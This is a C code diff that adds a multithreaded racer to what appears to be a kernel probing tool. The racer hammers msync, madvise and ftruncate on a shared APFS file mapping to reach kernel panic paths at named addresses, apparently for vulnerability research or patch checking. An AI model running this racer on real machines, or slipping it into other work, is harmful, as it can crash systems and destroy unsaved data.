@@ -171,6 +171,105 @@ int cow_file_probe(int rounds, int size_kb, const char *dir, int *stages)
     return first_err;
 }
 
+
+/* ---- APFS msync / invalidate racer ------------------------------------------
+   Targets the error-path panics in apfs_vnops.c that 27.2 removed:
+     "%s:%d: %s Failed to msync for ino %llu"          (site 0xfffffe000a9ac0f0)
+     "%s:%d: %s Failed to invalidate %llu:%llu for ino" (site 0xfffffe000a9ac62c)
+   Strategy: dirty a large shared mapping, then concurrently msync, madvise,
+   ftruncate and remap it so the APFS invalidation paths race hard. */
+typedef struct {
+    uint8_t *base;
+    int fd;
+    uint64_t size;
+    volatile int go;
+} apfs_arg_t;
+
+static void *apfs_writer(void *p)
+{
+    apfs_arg_t *a = (apfs_arg_t *)p;
+    while (!a->go) { }
+    /* bounded: pthread_cancel has no cancellation point in a pure memory loop */
+    for (int i = 0; i < 200000; i++) {
+        uint64_t off = (uint64_t)(rand() % 64) * 4096;
+        if (off < a->size) {
+            a->base[off] ^= (uint8_t)off;
+        }
+    }
+    return NULL;
+}
+
+static void *apfs_syncer(void *p)
+{
+    apfs_arg_t *a = (apfs_arg_t *)p;
+    while (!a->go) { }
+    for (int i = 0; i < 4000; i++) {
+        if (a->size < 8192) break;
+        uint64_t chunk = 4096u * (uint64_t)(1 + (rand() % 32));
+        uint64_t start = (uint64_t)(rand() % 64) * 4096;
+        if (start >= a->size) start = 0;
+        msync(a->base + start, chunk, (i & 1) ? MS_SYNC : MS_ASYNC);
+        if (i % 8 == 0) {
+            madvise(a->base + start, chunk, MADV_DONTNEED);
+        }
+        if (i % 64 == 0) {
+            fsync(a->fd);
+        }
+    }
+    return NULL;
+}
+
+/* stages: [0]=open/ftruncate [1]=mmap [2]=thread create */
+int apfs_race_probe(int rounds, int size_kb, const char *dir, int *stages)
+{
+    char path[512];
+    for (int r = 0; r < rounds; r++) {
+        uint64_t size = (uint64_t)size_kb * 1024u;
+        snprintf(path, sizeof(path), "%s/apfsrace_%d.bin", dir, r);
+        int fd = open(path, O_CREAT | O_TRUNC | O_RDWR, 0600);
+        if (fd < 0 || ftruncate(fd, (off_t)size) != 0) {
+            stages[0]++;
+            if (fd >= 0) close(fd);
+            continue;
+        }
+        uint8_t *base = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+        if (base == MAP_FAILED) {
+            stages[1]++;
+            close(fd);
+            continue;
+        }
+        /* dirty every page so there is real state to invalidate */
+        memset(base, 0x5a, size);
+
+        apfs_arg_t w = { base, fd, size, 0 };
+        apfs_arg_t sy = { base, fd, size, 0 };
+        pthread_t tw, tsy;
+        int ok = 1;
+        if (pthread_create(&tw, NULL, apfs_writer, &w) != 0) ok = 0;
+        if (pthread_create(&tsy, NULL, apfs_syncer, &sy) != 0) ok = 0;
+        if (ok) {
+            w.go = 1; sy.go = 1;
+            pthread_join(tsy, NULL);
+            pthread_join(tw, NULL);
+        } else {
+            stages[2]++;
+        }
+
+        munmap(base, size);
+        /* invalidation cycle after unmapping: ftruncate cannot SIGBUS here */
+        for (int k = 0; k < 8; k++) {
+            if (ftruncate(fd, 0) == 0) {
+                fsync(fd);
+                ftruncate(fd, (off_t)size);
+                fsync(fd);
+            }
+        }
+        close(fd);
+        unlink(path);
+    }
+    return 0;
+}
+
 /* stages: [0]=make_entry [1]=map1 [2]=map2 [3]=allocate [4]=copy [5]=thread */
 int cow_probe_run(int rounds, int size_kb, int *stages)
 {
